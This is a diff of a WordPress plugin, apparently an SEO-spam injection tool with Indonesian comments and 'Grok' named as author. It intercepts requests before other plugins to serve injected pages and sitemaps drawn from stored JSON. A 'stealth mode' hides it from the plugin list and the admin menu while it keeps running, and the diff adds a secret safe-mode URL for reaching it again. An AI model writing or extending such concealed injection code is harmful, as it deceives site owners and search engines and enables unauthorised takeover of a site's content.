@@ -1,8 +1,8 @@
 <?php
 /*
 Plugin Name: Additional Content Plugin
-Description: Plugin konten & sitemap stealth dengan Title Fix (Versi 7.5).
-Version: 7.5
+Description: Plugin konten & sitemap stealth dengan Jaminan Uptime (Versi 7.6).
+Version: 7.6
 Author: Grok
 */
 
@@ -26,24 +26,32 @@ function acp_get_storage_dir() {
 // ==========================================
 // 1. NUCLEAR HANDLER (SITEMAP & CONTENT)
 // ==========================================
+// Priority -9999 memastikan ini jalan SEBELUM plugin lain (RankMath, dll)
 add_action('plugins_loaded', 'acp_nuclear_handler', -9999);
 
 function acp_nuclear_handler() {
-    if (is_admin() || strpos($_SERVER['REQUEST_URI'], 'wp-admin') !== false || strpos($_SERVER['REQUEST_URI'], 'wp-login') !== false) {
+    // Kita hapus pengecekan is_admin() global agar tidak memblokir konten secara tidak sengaja.
+    // Kita hanya cek jika URL mengandung wp-admin DAN bukan permintaan konten kita.
+    
+    $request_uri = $_SERVER['REQUEST_URI'];
+    
+    // Abaikan jika ini request ke file PHP fisik di wp-admin atau wp-login
+    if (strpos($request_uri, '/wp-admin/') !== false || strpos($request_uri, '/wp-login.php') !== false) {
         return;
     }
 
-    $request_uri = $_SERVER['REQUEST_URI'];
     $path = parse_url($request_uri, PHP_URL_PATH);
     $filename = basename($path);
     
     // --- BAGIAN A: SITEMAP INTERCEPT ---
     if (strpos($request_uri, '.xml') !== false) {
+        // 1. Sitemap Index
         if ($filename === ACP_MAIN_SITEMAP) {
             acp_render_sitemap_index();
             exit;
         }
 
+        // 2. Child Sitemap
         $filename_no_ext = str_replace('.xml', '', $filename);
         $sitemap_name = $filename_no_ext;
         $page = 1;
@@ -60,17 +68,19 @@ function acp_nuclear_handler() {
                 exit;
             }
         }
-        return;
+        return; 
     }
 
     // --- BAGIAN B: CONTENT INTERCEPT ---
     $slug = trim($path, '/');
-    if (empty($slug) || preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|woff|ttf|svg)$/i', $slug)) {
+    if (empty($slug) || preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|woff|ttf|svg|php)$/i', $slug)) {
         return;
     }
 
     $title_key = urldecode($slug);
     $template_path = acp_get_storage_dir() . '/template.txt';
+    
+    // Cek keberadaan template lokal
     if (!file_exists($template_path)) return; 
 
     $endpoints = get_option('acp_endpoints', []);
@@ -81,26 +91,24 @@ function acp_nuclear_handler() {
         if (is_array($data)) {
             foreach ($data as $k => $v) {
                 if (strtolower($k) === strtolower($title_key)) {
-                    // KETEMU!
+                    // KETEMU! SAJIKAN KONTEN
                     
                     if (!headers_sent()) {
                         header('HTTP/1.1 200 OK');
                         status_header(200);
+                        // Header khusus untuk debugging bahwa plugin ini AKTIF
+                        header('X-ACP-Status: Active'); 
                     }
 
+                    // Bersihkan buffer output
                     while (ob_get_level()) {
                         ob_end_clean();
                     }
 
-                    // === DEFINISI VARIABEL UNTUK TEMPLATE ===
+                    // Variabel Template
                     $additional_content = $v; // Deskripsi
-                    
-                    // Membuat Judul dari Key JSON (misal: kitano-mina -> Kitano Mina)
-                    $title = ucwords(str_replace('-', ' ', $k)); 
-                    
-                    // Variabel cadangan jika template butuh raw slug
-                    $slug_raw = $k; 
-                    // ========================================
+                    $title = ucwords(str_replace('-', ' ', $k)); // Judul
+                    $slug_raw = $k;
 
                     include $template_path;
                     exit;
@@ -111,7 +119,7 @@ function acp_nuclear_handler() {
 }
 
 // ==========================================
-// 2. SITEMAP RENDERERS
+// 2. RENDERERS
 // ==========================================
 
 function acp_clean_output_buffer() {
@@ -208,12 +216,19 @@ function acp_get_local_json_count($filename) {
 }
 
 // ==========================================
-// 4. ADMIN PAGE
+// 4. STEALTH & ADMIN LOGIC (Fixed)
 // ==========================================
+
+// Logic untuk mengecek Safe Mode
+function acp_is_safe_mode() {
+    // Jika URL mengandung ?acp_safe_mode=1, paksa tampilkan menu
+    return isset($_GET['acp_safe_mode']) && $_GET['acp_safe_mode'] == '1';
+}
 
 add_filter('all_plugins', 'acp_hide_plugin_from_list');
 function acp_hide_plugin_from_list($plugins) {
-    if (get_option('acp_plugin_hidden', false)) {
+    // Sembunyikan hanya jika TIDAK dalam safe mode
+    if (get_option('acp_plugin_hidden', false) && !acp_is_safe_mode()) {
         $plugin_file = plugin_basename(__FILE__);
         if (isset($plugins[$plugin_file])) unset($plugins[$plugin_file]);
     }
@@ -223,7 +238,11 @@ function acp_hide_plugin_from_list($plugins) {
 add_action('admin_menu', 'acp_admin_menu', 999);
 function acp_admin_menu() {
     add_menu_page('Content Plugin', 'Content Plugin', 'manage_options', 'additional-content-plugin', 'acp_admin_page', 'dashicons-database');
-    if (get_option('acp_plugin_hidden', false)) remove_menu_page('additional-content-plugin');
+    
+    // Hapus menu hanya jika hidden aktif DAN tidak dalam safe mode
+    if (get_option('acp_plugin_hidden', false) && !acp_is_safe_mode()) {
+        remove_menu_page('additional-content-plugin');
+    }
 }
 
 function acp_generate_random_string($length = 5) {
@@ -231,6 +250,13 @@ function acp_generate_random_string($length = 5) {
 }
 
 function acp_admin_page() {
+    // Jika sedang safe mode, berikan opsi untuk mematikan hidden mode permanen
+    if (acp_is_safe_mode() && isset($_POST['acp_disable_stealth'])) {
+        check_admin_referer('acp_action');
+        update_option('acp_plugin_hidden', false);
+        echo '<div class="updated"><p>Stealth Mode dimatikan. Plugin kembali terlihat normal.</p></div>';
+    }
+
     if (isset($_POST['acp_toggle_visibility'])) {
         check_admin_referer('acp_action');
         $curr = get_option('acp_plugin_hidden', false);
@@ -255,7 +281,7 @@ function acp_admin_page() {
             $ep['status'] = file_exists(acp_get_storage_dir() . '/' . $ep['json_filename'] . '.json') ? 'active' : 'error';
         }
         update_option('acp_endpoints', $endpoints);
-        echo '<div class="updated"><p>Update Berhasil.</p></div>';
+        echo '<div class="updated"><p>Data Terupdate.</p></div>';
     }
     if (isset($_POST['acp_reset'])) {
         check_admin_referer('acp_action');
@@ -267,12 +293,30 @@ function acp_admin_page() {
     $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
     ?>
     <div class="wrap">
-        <h1>Content Plugin (V7.5 Title Fix)</h1>
-        <?php if ($is_hidden): ?><div class="notice notice-error"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
+        <h1>Content Plugin (V7.6 Safe Stealth)</h1>
+        
+        <?php if ($is_hidden): ?>
+            <div class="notice notice-warning" style="padding:10px; border-left: 4px solid #ffba00;">
+                <strong>STATUS: STEALTH (TERSEMBUNYI)</strong>
+                <p>Menu admin dan daftar plugin disembunyikan. Plugin <strong>TETAP AKTIF</strong> dan berjalan di background.</p>
+                <p>Jika Anda kehilangan akses menu, gunakan URL ini: <br> 
+                <code><?php echo admin_url('admin.php?page=additional-content-plugin&acp_safe_mode=1'); ?></code></p>
+            </div>
+        <?php endif; ?>
+
+        <?php if (acp_is_safe_mode()): ?>
+            <div class="notice notice-error">
+                <p><strong>SAFE MODE AKTIF:</strong> Anda sedang mengakses menu darurat.</p>
+                <form method="post">
+                    <?php wp_nonce_field('acp_action'); ?>
+                    <input type="submit" name="acp_disable_stealth" class="button button-primary" value="Matikan Stealth Mode (Munculkan Plugin)">
+                </form>
+            </div>
+        <?php endif; ?>
         
         <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
-            <div>Status: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
-            <form method="post"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Unhide' : 'Hide'; ?>"></form>
+            <div>Status Tampilan: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
+            <form method="post"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Munculkan Kembali (Unhide)' : 'Sembunyikan (Hide)'; ?>"></form>
         </div>
 
         <?php if (!$endpoints): ?>
